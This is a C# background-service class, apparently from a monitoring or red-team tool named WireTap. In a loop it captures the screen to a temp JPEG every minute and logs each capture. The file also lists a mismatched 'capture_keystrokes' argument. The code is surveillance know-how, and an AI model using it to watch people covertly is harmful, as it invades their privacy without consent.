namespace WireTap.WorkerService
{
    using Microsoft.Extensions.Hosting;
    using Microsoft.Extensions.Logging;
    using System;
    using System.Threading;
    using System.Threading.Tasks;

    public class ScreenshotWorker : BackgroundService
    {
        private readonly ILogger<ScreenshotWorker> _logger;

        public ScreenshotWorker(ILogger<ScreenshotWorker> logger)
        {
            _logger = logger;
        }

        public static string[] Arguments = new[] { "capture_keystrokes" };

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            _logger.LogInformation("ScreenshotWorker running at: {time}", DateTimeOffset.Now);

            while (!stoppingToken.IsCancellationRequested)
            {
                var tempFile = Helpers.CreateTempFileName(".jpeg", "screenshot-");
                Display.CaptureImage(tempFile);
                Console.WriteLine("[+] Screenshot captured at: {0}", tempFile);

                await Task.Delay(TimeSpan.FromMinutes(1));
            }
        }
    }
}
